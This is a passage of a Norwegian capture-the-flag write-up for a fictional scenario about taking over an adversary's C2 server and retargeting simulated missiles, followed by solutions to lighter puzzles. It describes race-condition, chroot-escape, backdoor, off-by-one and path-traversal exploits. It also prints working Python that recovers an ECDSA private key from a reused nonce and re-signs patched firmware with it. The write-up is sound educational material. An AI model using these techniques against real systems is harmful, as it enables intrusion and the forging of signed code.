Denne leser en payload fra requesten, dumper den til disk, og verifiserer payloaden fra requesten (ikke filen). Hvis signaturen er grei, så kopieres filen til databasen og lagres der til klienten ber om kommandoer. Signatur-sjekken bruker DSS med ganske store tall, og tar derfor noe tid. I alle fall et par hundre millisekunder. Brukeren som jeg kan styre har skrivetilgang til `/tmp/.../`, men ikke skrivetilgang til filene som opprettes der. Derimot kan jeg bare slette filene, og lage nye. En mulig løsning er derfor å generere et Config-objekt (siden disse kjører kommandoer før signatursjekk) og sende en gyldig kommando til C2-serveren ment for DEADBEEFDEADBEEF. Mens filen ligger på disk, så kan denne slettes og erstattes med en annen.

#### Metode 3 - DOS

Ved å fylle opp harddisken og spamme mye til C2-serveren som fyller opp sqlite-databasen og lignende, er det mulig å kræsje hele webserveren. Deretter kan man starte opp sin egen webserver på samme port og servere payloads som ikke er signerte. Så lenge dette er objekter som kjører kode før signatur-sjekk, vil det fungere på samme måte som metode 2. Problemet her er at CTFen har healthchecks overalt, og om serveren man setter opp ikke svarer på disse, så resettes hele serveren

Uansett metodikk så får jeg til slutt tilgang til `cloud-hq-79` og der ligger neste flagg, som gir enda en SSH-nøkkel for fremtiden.

> Det er noe veldig tilfredstillende med å utnytte sårbarheter i skadevare.
> 
> Dette ser ut som operatøren bak angrepet mot kraftverket. Jeg legger ssh-nøkkelen hans i oppdragsmappen din mens du går gjennom koden som ligger her.
> 
> Ny fil: /home/login/2_oppdrag/sshkey_cloud-hq

### 2.10_infrastruktur

Inne på serveren ligger det kode som blant annet lar en generere egne payloads. På toppen av filen `~/src/client/GenCommand.java` ligger siste flagg og nå er vi endelig ferdig og kan feire jul :)

> Vi har nå god kontroll på Utlandias infrastruktur for cyberoperasjoner.
> 
> Vi mangler fortsatt informasjon om det gamle regimets planer. Informasjonen du har samlet inn vil bli overlevert til våre analytikere som vil sammenstille en rapport. De håper på å være ferdig med vurderingene sine torsdag 22. desember. Når vi vet mer vil vi informere via discord og med en ny melding i oppdragsmappen.
> 
> Forbered for fremtidige operasjoner og avvent ytterligere ordre.

...eventuelt ikke. Del 2 av oppdraget ble lansert lille julaften i stedet for den 22. og fikk ikke så mye oppmerksomhet fra min side før et stykke uti.

### 2.11_aurum_shell

Etter noen dager endrer hintet seg

> Vi har nå god kontroll på Utlandias infrastruktur for cyberoperasjoner.
> 
> Vi mangler fortsatt informasjon om det gamle regimets planer. Informasjonen du har samlet inn vil bli overlevert til våre analytikere som vil sammenstille en rapport. Rapporten vil legges i oppdragsmappen din på corax så snart det lar seg gjøre.
> 
> Forbered for fremtidige operasjoner og avvent ytterligere ordre.
> 
> Ny fil: /home/login/2_oppdrag/INTREP-2.txt

INTREP-2 nevner et angrep fra ubåter og krig og fred og sånt. 

Når jeg sjekker hvilke servere som sjekker inn mot C2 igjen så er det kommet en oppdatering fra en eldre server, kalt aurum, som har vært stille ganske lenge.

```bash
$ curl http://shady-aggregator.utl/f52e6101/list
ID               | NAME                             | LAST CHECKIN
-----------------+----------------------------------+--------------------
DEADBEEFDEADBEEF | test-3                           | 2023-01-05 01:05:03
42FD29AED93B779C | pwr-ws-caf5db                    | 2023-01-05 01:04:42
18F53CE5F533ACF7 | aurum                            | 2023-01-05 01:04:15
```

Nå har jeg full tilgang til å lage egne payloads, så å sende den kommandoer som gir meg SSH-tilgang er enklere enn for 2.09.

Ved innlogging til aurum popper det opp en ku som sier flagget

```bash
 __________________________________
< aad3.....................4e44b829 >
 ----------------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```

> Hva brukes denne maskinen til?

### 2.12_missile_targets

`.bash_history` er interessant her

```bash
ls -lah
which signer
signer --help
echo "Testing testing" > test.txt && signer --file-name test.txt --key-file privkey.pem --rng-source urandom
rm test.txt
konekt
signer --file-name missile.1.3.37.fw --key-file privkey.pem --rng-source urandom
mv missile.1.3.37.fw_signed missile.1.3.37.fw
konekt
rm privkey.pem missile.1.3.37.fw
```

Jeg starter med å hente ut filene `signer` og `konekt`. `signer` er et ganske stort Rust-program som kan signere filer, noe som ser ut til å bli gjort med secp256k1 og sha256. `konekt` er en tynn wrapper rundt en socket-forbindelse til en server med hostname `mad`, som det kobles til på port 1337. 

Ved å bla rundt i menyene i `konekt`, så ser jeg at det er mye jeg ikke har tilgang til.

- Jeg kan liste programmer og printe ut assembly, men ikke kjøre programmer.

- For missilene kan jeg liste alle ubåtene med missiler, men ikke simulere utskytningen eller oppgradere firmware.

- For firmware kan jeg liste og laste ned firmware-filer, men ikke laste opp.

- I bruker-menyen kan jeg se tilgangene mine, men jeg får ikke lov å skifte navn.

På bunnen av missil/ubåt-listen er neste flagg

> Bra jobba! Dette må være kontrollsystemet til missilene. Målparametrene er allerde lagt inn og sikter på mange vestlige byer!
> Dette er viktig informasjon som vi har levert videre til våre oppdragsgivere. Analytikerene våre har plottet målene for deg, sjekk oppdragsmappen.
> Som du forstår er det ekstremt viktig å forhindre dette!
> 
> Ny fil: /home/login/2_oppdrag/worst_case_scenario.jpg

### 2.13_findflag

Under program-menyen er det et program som heter `findflag.prg`, men jeg har ikke tilgang til å kjøre det

```
╒══════════════════════════════════════════════════════════════════════╕
│                                                          run program │
╞══════════════════════════════════════════════════════════════════════╡
│ access denied. required:0x01 (A-------)                              │
└──────────────────────────────────────────────────────────────────────┘
```

Ved å laste ned filene `server-software.tar.xz` og `missile.1.3.37.fw` fra firmware-menyen får jeg tilgang til programvaren som kjører på remote. Den initialiserer en socket og starter opp et program vi ikke har tilgang til ("kontrol"), før den forker ut en connection og kaller `chroot()` for å hindre alle fra å komme seg inn på selve filsystemet. Her legger jeg merke til at vi har fått en seccomp.so-fil, men det er ikke noe seccomp i selve programmet. chroot() alene er også helt ubrukelig uten en chdir() først - gjerne etterfulgt av nedgradering av permissions, og man skal også passe på at det ikke er åpne file descriptors med annen chroot. I alle andre tilfeller kan man bryte seg ut. Denne feilen er så åpenbar at jeg tror det er veien videre, men pga. julefeiring legger jeg oppgaven på is. I mellomtiden løser noen andre plutselig 95% av oppdraget i en stor jafs, og det viser seg at de har utnyttet dette hullet, og nå er det blitt tettet for resten.

Videre reversing viser at det er en bakdør i programmet, og hvis man skriver "backdoor" baklengs så får man utvikler-status. Med denne kan man endre navn, og pga. en off-by-one i navne-endringen kan man oppgradere til full admin ved å bytte til et blankt navn. Herfra kan jeg laste opp firmware, og via path traversal kan jeg laste opp firmware og så kjøre disse som et program med `../firmware/navn` fra "run program"-menyen. Ikke minst kan vi nå kjøre `findflag.prg` som gir oss et pent bilde - og neste flagg!

![](2023-01-05-01-29-40-image.png)

> Herlig! Vi har nå lov til å kjøre programmer. Kan du bruke dette til noe?

### 2.14_multiplier

Jeg løste denne etter 2.15, siden 2.15 gir et hint til at man må løse denne før 2.16:

> Firmwaren ser ut til å være beskyttet av en form for signatursjekk. Hvis du klarer å finne en måte å bestå denne sjekken på så kan du levere det du finner med `scoreboard FUNN` for en liten påskjønnelse, hvis du ikke allerede har gjort det.

Min tidligere observasjon tilsa at de brukte sha256 og secp256k1, og erfaringsmessig er dette en trygg kombo. Unntaket er hvis man skulle finne på å gjenbruke nonces for to ulike meldinger, så dette blir det neste jeg sjekker.

Jeg har to filer som er signerte, ut i fra bash history. Dette er `test.txt_signed`, som ligger i hjemmeområdet og `missile.1.3.37.fw` som ligger på serveren. Signaturene består av to 256-bit koordinater, r og s, så de bør være representert med 64 bytes et sted i filen. Ut i fra test.txt ser det ut som om disse ligger bak dataene. Jeg leser ut og parser signaturene:

```python
from Crypto.Util.number import bytes_to_long as b2l, long_to_bytes as l2b
from hashlib import sha256

data1 = open("test.txt_signed", "rb").read()
z1 = b2l(sha256(data1[:-64]).digest())
r1 = b2l(data1[-64:-32])
s1 = b2l(data1[-32:])

data2 = open("missile.1.3.37.fw", "rb").read()
z2 = b2l(sha256(data2[:-64]).digest())
r2 = b2l(data2[-64:-32])
s2 = b2l(data2[-32:])

print(f"{r1=}")
print(f"{r2=}")
print(f"{s1=}")
print(f"{s2=}")
```

og får output

```
r1=17211542253021086784505659283610982505828311641993563606189014132281847868803
r2=17211542253021086784505659283610982505828311641993563606189014132281847868803
s1=24672148393105490807172642003357033928250921460564351943433773766105747062038
s2=82789957276224960427052465459370715358048161416963169362889803353386861085840
```

Så det er noe galt med `signer`-programmet, for det gjenbruker nonces! r-verdiene for de to ulike signaturene er helt like, og det skal ikke skje. Dette betyr at vi kan enkelt finne igjen nøkkelen de brukte med litt matte

```python
order = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141
k = ((z1 - z2) * pow(s1 - s2, -1, order)) % order
d1 = (s1*k - z1) * pow(r1, -1, order) % order
d2 = (s2*k - z2) * pow(r2, -1, order) % order

assert d1==d2
privkey = d1
```

og det ser ut til å stemme. Privatnøkkelen er `114798114433974422739242357806023105894899569106244681546807278823326360043821` og det er også flagget her.

> Dette ser ut til å være privatnøkkelen som de bruker i ECDSA-signeringen sin. Som det kjente ordtaket går -- "Never roll your own crypto". La oss håpe denne nøkkelen kan brukes til noe nyttig :)

### 2.15_firmware_staged

Eksempel-programmene som ligger i programs-området er gull verdt, for nå skal vi skrive vårt eget. Serveren kjører aarch64/arm64 så vi må også skrive shellcode som gjør noe lignende. En observasjon er at flere av programmene og funksjonene i `fracture`-programmet kobler til en intern server og sender data dit. `telemetry.prg` lager en socket og sender "tele" til den, mens `fracture` sender "list" når den ber om en liste over alle missilene og "simu" når den vil at missilene skal simulere banene de tar på vei til sin destinasjon.

Jeg modifiserer telemetri-programmet til å sende "rofl" i stedet, og får tilbake en slags usage-hjelpeoversikt

```
ping    is service listening?
        arguments: None
        response: 'pong'
list    list submarines and missiles
        arguments: None
        response: text
tele    show telemetry when missiles are in flight
        arguments: None
        response: text
flsh    stage missile firmware to be flashed
        arguments: ['u16le:submarine', 'u16le:missile', 'binary:firmware']
        response: text
```

Når vi forsøker å flashe missilene via menyen for det, så får vi beskjed om at programmet `flash.prg` ikke finnes, så nå er tiden inne for å lage dette selv. Dette krever å holde tunga beint i munnen, for det er ikke 100% normal shellcode som kan skrives. Det første å legge merke til er at det sendes inn flere argumenter og parametere når et program kjøres. Et av disse er et register som inneholder file descriptor til socketen som jeg er koblet til. Dette er eneste måten å faktisk skrive data slik at de kan leses ut igjen. `flsh`-kommandoen tar også inn parametere, og disse kommer fra argumentene gitt til `flash.prg`, som vi nå skal skrive.

Strategien blir altså å skrive shellcode som kan

1. Lagre unna argumenter og output-socket-fd

2. Lage og ta vare på en socket

3. Koble denne socketen til kontrol-serveren

4. Sende "flsh" etterfulgt av submarine/missile-nummer fra argumentene

5. Åpne en fil (basert på arguments) og ta vare på file descriptoren

6. Bruke sendfile-syscallet til å koble sammen fil-fd og socket-fd, slik at denne sendes i sin helhet til kontrol

7. Lese tilbake data som kommer fra kontrol

8. Skrive data fra kontrol tilbake til output-socket-fd

9. Lukke alle sockets og file descriptors og gjøre klar til neste flash-operasjon

Jeg endte opp med å hardkode filnavnet i steg 5, og kjørte heller flere upload-runder. Jeg flashet også bare den ferdig-signerte firmwaren som lå på serveren fra før, da jeg enda ikke visste hvorda jeg signerte disse selv. Ved å laste opp en ny firmare til `../programs/flash.prg` får vi erstattet det manglende flash-programmet og kan nå bruke menyen til å flashe igjen.

Etter å ha lest all output tilbake fra flash-operasjonen mot kontrol-serveren så kommer neste flagg

```
[+] FLASH 0:00 274c4
[+] 7f454c46010101000000000000000000020028000100000025c3000034000000...
[+] Signature OK
[+] FLAG: 7f34ada...
```

Og ved innlevering får vi en ganske lang beskrivelse, samt et hint til hva 2.14 går ut på:

> Wow! Firmware staged for flash når ubåten dykker opp! Oppdragsgiver ønsker at vi skal manipulere målkoordinatene til å treffe et trygt sted (24.1851, -43.3704). Klarer du dette? Firmwaren ser ut til å være beskyttet av en form for signatursjekk. Hvis du klarer å finne en måte å bestå denne sjekken på så kan du levere det du finner med `scoreboard FUNN` for en liten påskjønnelse, hvis du ikke allerede har gjort det.
> 
> Analytikerene våre indikerer at ubåt nr. 1 sannsynligvis vil dykke opp i Biscayabukta, ubåt nr. 2 mellom Island og de Britiske øyer, ubåt nr. 3 ca. 100-200 nm sør/sør-øst for Italia, ubåt nr. 4 ca. 300-500 nm sør/sør-vest for Irland, og ubåt nr. 5 ca. 200-400 nm vest for Portugal. Bruk denne informasjonen for å regne ut de parametere du trenger.
> 
> Siden alle missilene i hver ubåt skal til samme mål, må firmware være identisk for hvert missil per ubåt.

### 2.16_submarine_0.. 2.20_submarine_4

Oppgave 2.16 til og med 2.20 er egentlig akkurat den samme oppgaven, bare med ulike start-posisjoner. Målet nå er å fokusere på firmware-filen `missile.1.3.37.fw`. Reversing av den viser et ganske kjent miljø, nemlig Zephyr RTOS kompilert for ARM Cortex M3. Programvaren inneholder et styringssystem for missilene, og er inndelt i flere ulike faser, som hver kan ha definert en entry, exit og run-funksjoner.

- Fase 0: Idle

- Fase 1: Armed entry, run, exit

- Fase 2: Powered flight run

- Fase 3-4: Ballistic flight entry, run, exit

- Fase 5: Error

Error-tilstanden nås hvis det detekteres noe inkonsistent med verdensbildet til missilen, men ellers går den gjennom alle fasene fra 0 til 4. Mens missilen beveger seg, sendes det statusoppdateringer i form av floats og doubles som printes ut over UART. Missilen ser også ut til å ha hardkodede parametere, noe som blir viktig senere.

Jeg flasher samme firmware til alle missilene, og så starter jeg en simulering. Dette tar veldig lang tid. Det virker som om maksimal kjøretid for missilene er nøyaktig 18 minutter, men de kan kræsje før. Outputen er noe sånt som det her, men nedkortet til å bare vise siste status-oppdatering:

```
╒════════════════════════════════╕
│   simulate all missile flights │
╞════════════════════════════════╡
│                     [AD----SO] │
SUB:1 ALL FIRMWARES EQUAL => PASS
SUB:2 ALL FIRMWARES EQUAL => PASS
SUB:3 ALL FIRMWARES EQUAL => PASS
SUB:4 ALL FIRMWARES EQUAL => PASS
SUB:5 ALL FIRMWARES EQUAL => PASS

SUB:1 M:1 (from (45.0, -5.0))
[+] time:18.00m altitude:-14.00m velocity:0.0 position:51.5099 -0.1181 distance:4645279.56m
SUB:2 M:1 (from (60.0, -10.0))
[+] time:18.00m altitude:-13.72m velocity:0.0 position:51.5098 -0.1180 distance:4645276.68m
SUB:3 M:1 (from (37.0, 19.0))
[+] time:18.00m altitude:-10.64m velocity:0.0 position:51.5099 -0.1182 distance:4645271.63m
SUB:4 M:1 (from (50.0, -20.0))
[+] time:18.00m altitude:-16.13m velocity:0.0 position:51.5099 -0.1179 distance:4645283.65m
SUB:5 M:1 (from (40.0, -15.0))
[+] time:18.00m altitude:-12.94m velocity:0.0 position:51.5099 -0.1180 distance:4645285.66m
```

Her får vi også oppgitt mer nøyaktige startposisjoner enn bare "Biscayabukta" og lignende. Målet vårt er fortsatt å treffe (24.1851, -43.3704), men hvordan er egentlig parameterne lagret, og hvilket format er det i?

For å gjøre en lang historie kort, så er dette området i missil-firmwaren det eneste man trenger å endre på.

```
.rocket_parameters:00018F30 ; Segment type: Pure data
.rocket_parameters:00018F30                 AREA .rocket_parameters, DATA, ALIGN=3
.rocket_parameters:00018F30                 ; ORG 0x18F30
.rocket_parameters:00018F30                 EXPORT _tof
.rocket_parameters:00018F30 _tof            DCB 0, 0, 0, 0, 0, 0xE0, 0x90, 0x40
.rocket_parameters:00018F30                                         ; DATA XREF: armed_entry+28↑o
.rocket_parameters:00018F30                                         ; text:off_7844↑o
.rocket_parameters:00018F30                                         ; 1080.0 "<d"
.rocket_parameters:00018F38                 EXPORT _target_coords
.rocket_parameters:00018F38 ; double target_coords[3]
.rocket_parameters:00018F38 _target_coords  DCD 0xE5F00284, 0x414E407A, 0xBDED1F9C
.rocket_parameters:00018F38                                         ; DATA XREF: armed_entry+8↑o
.rocket_parameters:00018F38                                         ; text:off_7840↑o
.rocket_parameters:00018F38                 DCD 0xC0BFEC9B, 0xD69CF174, 0x415305CD
.rocket_parameters:00018F38 ; .rocket_parameters ends
```

Koordinatene er lagret som 3 floats, som tar opp 8 bytes hver. Ved å se på missilene i listen på serveren, er det mulig å se deres destinasjon. For programmet over er det

`1080.00 |  3965173.80 |    -8172.61 |  4986679.35 `

og i følge simuleringene skal dette matche `51.5099, -0.1180` i lat/lon. Jeg brukte ganske lang tid på å finne ut hva slags format disse koordinatene var på, for det lignet litt på [ECEF](https://en.wikipedia.org/wiki/Earth-centered,_Earth-fixed_coordinate_system), men konvertering til ECEF ga små merkeligheter. Første missil pekte på London Bridge, men 6000 meter opp i lufta. Nummer 2 var stilt mot Birmingham, men så ut til å sikte på et lite skur utenfor byen.

Etter å ha reverset mer av koden, så innså jeg at det *er* ECEF, men de har antatt at jorda er en perfekt kule med radius `6371000`. Dette forenkler kalkulasjonene noe på mikrokontrolleren, men det gjør at vi må modifisere ulike verktøy til å regne med dette. Jeg skrev om en funksjon `lla2ecef` til å bruke de nye parameterne

```python
def lla2ecef(lat, lon, alt):
    a = 6371000
    a_sq = a**2
    e = 0 # 8.181919084261345e-2
    e_sq = 0 # e**2
    b_sq = a_sq # a_sq*(1 - e_sq)

    lat = np.array([lat]).reshape(np.array([lat]).shape[-1], 1)*np.pi/180
    lon = np.array([lon]).reshape(np.array([lon]).shape[-1], 1)*np.pi/180
    alt = np.array([alt]).reshape(np.array([alt]).shape[-1], 1)

    N = a/np.sqrt(1 - e_sq*np.sin(lat)**2)
    x = (N+alt)*np.cos(lat)*np.cos(lon)
    y = (N+alt)*np.cos(lat)*np.sin(lon)
    z = ((b_sq/a_sq)*N+alt)*np.sin(lat)

    return x[0][0], y[0][0], z[0][0]
```

og den spyttet ut at målet vårt blir

`(4224766.330344398, -3991030.5468107667, 2610108.3556840476)`

Jeg programmerte inn denne destinasjonen i firmwaren og signerte den på nytt 

```python
before = bytes.fromhex("8402f0e57a404e419c1fedbd9becbfc074f19cd6cd055341")
after  = struct.pack("<ddd", 4224766.330344398, -3991030.5468107667, 2610108.3556840476)

data = open("missile.1.3.37.fw","rb").read()[:-64] # Skip signature
assert before in data and data.count(before) == 1
data = data.replace(before, after)

with open(f"firmware_new.elf","wb") as fd:
    fd.write(data)
    r,s = ecdsa.sign(data, privkey, curve.secp256k1, sha256)
    fd.write(l2b(r, 32))
    fd.write(l2b(s, 32))
```

men missilene kræsjet. Jeg hadde nemlig ignorert en viktig variabel, nemlig den mystiske "TOF" som var satt til 1080 originalt. 1080/60 = 18, så det er der 18 minutter flytid kom fra. TOF står for "Time of flight", og er et estimat missilen bruker for å beregne banen sin målet. Om denne er altfor lav, så ender missilen opp med å ta en for lav bane og kræsje. Her måtte jeg egentlig finne en måte å regne ut TOF på, men jeg valgte å gjøre et par antagelser i stedet.

Først så jeg på standard-oppsettet av missilene som allerede er flashet før vi gjør noe.

```
Sub3-16 (37.0, 19.0)  -> ~(38.303683, 13.366667) =  517.65km med  600 = 10min TOF
Sub1-1  (45.0, -5.0)  -> ~(51.5099, -0.1180)     =  809km    med 1080 = 18min TOF
Sub1-2  (45.0, -5.0)  -> (52.675010, -1.898575, 6344.03) =  883km    med 1080 = 18min TOF
Sub1-10 (45.0, -5.0)  -> (52.264908,  4.288788, 6195.82) = 1057km med 1100 = 18.33 min TOF
Sub1-6  (45.0, -5.0)  -> ~(56.042556, -4.251806) = 1229.48km med 1200 = 20min TOF
Sub4-1  (50.0, -20.0) -> ~(38.170614, 23.727539) = 3678.69km med 2200 = 36.66min TOF
```

og legger merke til at TOF er satt gradvis høyere jo lengre unna man er. Hva er så avstandene fra ubåtene til det nye målet?

```
Target = (24.1851, -43.3704)
Sub1: (45.0, -5.0)  4151.48 km
Sub2: (60.0, -10.0) 4740.57 km
Sub3: (37.0, 19.0)  6041.30 km
Sub4: (50.0, -20.0) 3507.48 km
Sub5: (40.0, -15.0) 3178.97 km
```

Så alt fra ~3200 til ~6000 km. Jeg velger da å sette noen konservativt høye verdier for TOF på alle missilene, for vi har evig med drivstoff og ingen begrensninger på hvor høyt vi kan fly. Så selv om det blir verdens høyeste parabel langt ut i verdensrommet, så vil en lang TOF treffe til slutt. Problemet er ventetiden, for missilene kjøres saktere enn real-time på serveren. (Et tips til neste gang, er at det er mulig å kompilere Zephyr for x86_64 og kjøre det rett på Linux også.)

Endelige TOFs for testing ble
`TOFS = [2300.0, 2400.0, 2600.0, 2200.0, 2200.0]`

og dette skriver jeg over original-verdien på 1080.0 med

```python
data.replace(struct.pack("<d", 1080.0), struct.pack("<d", TOFS[i]))
```

Etter rundt en halvtime treffer første missil perfekt, og jeg får første flagget. Etter totalt 4 timer og 48 minutter har alle missilene truffet og printet sine flagg.

Alle disse flaggene gir samme tilbakemelding:

> For mission complete må du konkatenere flaggene for 2.16 - 2.20

### 2.21_mission_complete

Siste oppdrag er bare å legge alle flaggene etter hverandre og så er det slutt!

> Gratulerer! Du har reddet Europa! ... og fullført oppdraget :) Vi er mektig imponert :D
> 
> Ny fil: /home/login/2_oppdrag/mission_complete.jpg

## 3.1 Utfordringer lett

### 3.1.1 Blekksprutspillet

#### Intro

En vag referanse til Squid Game, men oppgaven har lite med serien å gjøre. Her skal vi koble til en server og sende inn Lua-kode for å spille et bestemt spill på en optimal måte.

Spillet går ut på at 456 deltakere blir markert med et synlig nummer fra 1 til og med 456. Deretter går de inn i et spillrom, en etter en, hvor det ligger 456 konvolutter markert med tall fra 1 til og med 456. Inni hver konvolutt ligger det et tilfeldig nummer - også mellom 1 og 456 - som er uavhengig av nummeret på konvolutten. Hver deltaker får gå inn i rommet og åpne maksimalt 456/2=228 konvolutter, eller til de finner sitt eget nummer. Hvis **alle** deltakerne klarer å finne sitt eget nummer på maksimalt 228 forsøk, så vinner alle sammen. Om en eneste deltaker ikke finner sitt nummer før halvparten av konvoluttene er åpnet, så taper alle.

En ting å merke seg er at det ikke er noen mulighet til å signalisere til de andre hva som er i hver konvolutt. Spillrommet blir altså nullstilt tilbake 100% slik det var før første person gikk inn, og det er ikke mulig å kommunisere med de andre etter man har forlatt rommet.

Som et eksempel er denne kodesnutten lagt ved

```lua
-- example.lua
while true do
    env_no = RandomEnvelope()
    card = OpenEnvelope(env_no)
    if card == goal then return env_no end -- success!
    if card == nil then return nil end -- death :(
end
```

hvor de plukker en tilfeldig konvolutt om og om igjen. Dette gir en sjanse på (1/2)^(456) for å vinne, noe som ikke er allverdens. Målet er å finne en bedre strategi.

#### Løsning

Denne oppgaven er også kjent som [The 100 prisoners problem](https://en.wikipedia.org/wiki/100_prisoners_problem) og har en del interessante varianter. Løsningen er at hver deltaker velger konvolutten med sitt eget nummer på først, og så åpner de konvolutten og ser på tallet. Det tallet bestemmer neste konvolutt man skal plukke, helt til man enten plukker sitt eget tall eller går tom for forsøk. Den eneste måten man kan ende opp i en "løkke" er hvis man trekker et tall som peker tilbake på tallet man startet med, og det er jo nummeret som deltakeren er interessert i å finne. Dette endrer problemet til "Er den lengste sykelen av tall som peker på hverandre lengre enn 228?", og mye fancy matematikk kan vise at dette gir over 31% sjanse for å vinne med 100 personer - og ca. det samme for 456. Koden for å løse denne er veldig lik eksempelet.

```lua
env_no = goal
while true do
    card = OpenEnvelope(env_no)
    if card == goal then return env_no end -- success!
    if card == nil then return nil end -- death :(
    env_no = card
end
```

Ved å sende inn denne koden til `blekksprut 1337` kjøres det 1000 simuleringer og man får flagget til slutt. Grenseverdien er ganske nøyaktig, så det kan hende man må prøve et par ganger om man er riktig uheldig.

### 3.1.3 Kaffemaskin

> Det har blitt tradisjon at cybertalentene våre hacker kaffemaskinen sin i løpet av kursperioden. Det inspirerte kullet som startet i august 2022 til å lage denne oppgaven.
> 
> De hadde i utgangspunktet bestilt 100 maskiner slik at hver CTF-bruker kunne jobbe mot sin egen maskin. Bestillingen ble desverre offer for logistikk-problemene som har plaget store deler av verden i løpet av året. Som et alternativ er det en emulert kaffemaskin tilgjengelig på http://teapot/
> 
> Oppgaven din er å lage en perfekt kopp med varm drikke.

Denne oppgaven var nokså underspesifisert, men oppdraget var å brygge te. Man måtte lese [RFC7168](https://datatracker.ietf.org/doc/html/rfc7168) og gjette seg litt fram. Det var mulig å etterspørre gyldige te-typer, og de var ute etter varianten "cybertalente". Vi måtte også akseptere melk i teen, samt sende en BREW-kommando etterfulgt av WHEN på et perfekt timet intervall. Den endelige løsningen var noe sånt som

`curl -XBREW -H "Content-Type: message/coffeepot" "http://teapot/cybertalente" -H "Accept-Additions: milk"; sleep 5; curl -XWHEN "http://teapot/cybertalente"`

hvor jeg venter 5 sekunder mellom BREW og WHEN.

```
Say WHEN it's enough milk
WOW! Perfect tea! Here is you're flag: 6071a74656...
```

### 3.1.3 Sirclive

> Oppgaven består av flere oppgaver som hver har sitt eget flagg. Du trenger ikke løse dem i rekkefølge. Flaggene er *ikke* markert med FLAG, men med ett unntak er de åtte hexadesimale siffer.

Utdelt fil: `sirclive.wav`. Ingen mer informasjon.

Det er mange referanser i denne oppgaven, og det trengs, for filformatet peker ikke direkte på hva vi har med å gjøre. Hører man på lydfilen så hører man noe om "Spectrum", og "sirclive" peker til [Sir Clive Sinclair](https://en.wikipedia.org/wiki/Clive_Sinclair), som er kjent for å finne opp blant annet ZX Spectrum. Vi har altså å gjøre med et opptak av en ZX Spectrum-kassett i digitalt format.

Jeg hadde så vidt vært borti ZX80 pga. CERT SE sin CTF, og børstet støv av [Fuse](https://fuse-emulator.sourceforge.net/)-emulatoren. Her åpner vi opp wav-fila og får opp denne startskjermen:

![](2023-01-04-21-02-15-image.png)

#### 3.1.3_sirclive_x

Allerede her har vi et flagg, nemlig flagget med teksten `Loading` på. Flagget er `LOADING`.

Etter litt innlasting får vi opp denne skjermen

![](2023-01-04-21-04-38-image.png)

her er det 5 valg, og hvert valg gir et flagg. Som oppgaveteksten sier, så kan disse gjøres i valgfri rekkefølge og er helt uavhengige av hverandre.

#### 3.1.3_sirclive_0

Valg 0 sier "Back to BASIC" og ser ut til å avslutte programmet. I Fuse med Spectrum 48K så er man nå fastlåst i en grå skjerm. På en annen emulator som LnxSpectrum får man derimot lov å velge blant flere programmer når man slutter å lese fra en kassett. Hvis vi velger å programmere i "128 BASIC" ser vi noe rart i koden som de viser oss.

![0_basic.png](0_basic.png)

Flagget her er altså `C3F451A2`.

#### 3.1.3_sirclive_1

Valg 1 er et memory-spill. Jeg vet ikke om det var et maksimalt antall forsøk på å finne par, men jeg løste spillet manuelt. Like før slutten ser det sånn her ut

![](2023-01-04-21-10-40-image.png)

og etter man løser det får vi ut noe kode

![1_code.png](1_code.png)

Ved å kjøre denne koden så får vi ut flagget, men den kan ikke kjøres uten å ha spilt spillet først, ellers blir den dekrypterte teksten "PLAY THE GAME FIRST".

```python
data = bytes([188,194,187,169,171,154,141,136])

for i in range(len(data)):
    c = data[i]
    c = (c + 123 + i*7) & 0xff
    print(chr(c), end="")
```

Flagget blir til `7DD9B824`

#### 3.1.3_sirclive_2

Spill 2 er bare en snakkeboble som ser sensurert ut 

![](2023-01-04-21-14-29-image.png)

men ved å bruke LnxSpectrum sin sprite finder, kan man skru av fargene. 

![2023-01-04-21-15-34-image.png](2023-01-04-21-15-34-image.png)

Da blir det mulig å se hva som står under, og at flagget er `148AF017`.

#### 3.1.3_sirclive_3

Valg 3 heter "Pentagon", bare skrevet på russisk. Ser vi på skjermen i Fuse så får man fort vondt i øynene, for det er bare mange farger som glir over skjermen mens det står "PENTAGON ONLY!" under.

![2023-01-04-21-18-25-image.png](2023-01-04-21-18-25-image.png)

Da går vi til "Machine -> Select" og velger "Pentagon 128K". Dette starter maskinen på nytt, og nå er det mulig å se hva som står.

![](2023-01-04-21-20-08-image.png)

fortsatt ikke helt smertefritt for øynene, men flagget er `A7C631B0`. [Pentagon](https://en.wikipedia.org/wiki/Pentagon_(computer)) er visst en klone av ZX Spectrum 128, og har tydeligvis noen quirks som gjør at ting ser litt annerledes ut.

#### 3.1.3_sirclive_4

Jeg tok ikke helt referansen på denne først, men det som møter deg i spill 4 er basically en slags kopibeskyttelse kjent som [Lenslok](https://www.c64copyprotection.com/lenslok/), og ble brukt på blant annet spillet "Elite".

![2023-01-04-21-22-38-image.png](2023-01-04-21-22-38-image.png)

Den krever at du har en proprietær linse for å dekode det som står, men jeg fant alternativet [LensKey](https://simonowen.com/spectrum/lenskey/) som åpner en liten widget som kan gjøre det samme. Med den klarte jeg å dekode det som sto, og på den etterfølgende skjermen fant jeg siste flagg: `84D97AE1`.

![elite.png](elite.png)

## 3.2 Utfordringer middels

### 3.2.1.x K13

#### Øve - lett

I denne serien med oppgaver blir vi introdusert til "programmeringsspråket" *KONTROLL-13*, eller bare K13. Det hostes en nettside på https://k13.cybertalent.no hvor dokumentasjon for selve språket og alle APIer er forklart. Man kan også bygge og kjøre programmer, samt gjennomføre et øvingsopplegg som gir deg flagg. Språket ligner noe på NPST sitt [SLEDE8](https://github.com/p26e/slede8/), bare at de har valgt å gjøre det 13-bits og fjerne nyttige instruksjoner for sammenligning av verdier.

Jeg skal ikke gå veldig i dybden på disse oppgavene, men det var et par triks med noen av de.

RTFM-oppgaven er bare å ta eksempelet fra /BYGGE og bytte ut teksten i Data-segmentet.

Sum of all fears, it compares, encryption og decryption er også forholdsvis raske, og er vedlagt som programfiler under [K13](/k13). Calculator er første oppgaven hvor det begynner å bli tricky, og arbeidsbelastningen er betydelig mer enn for de foregående oppgavene.

#### Fastulator

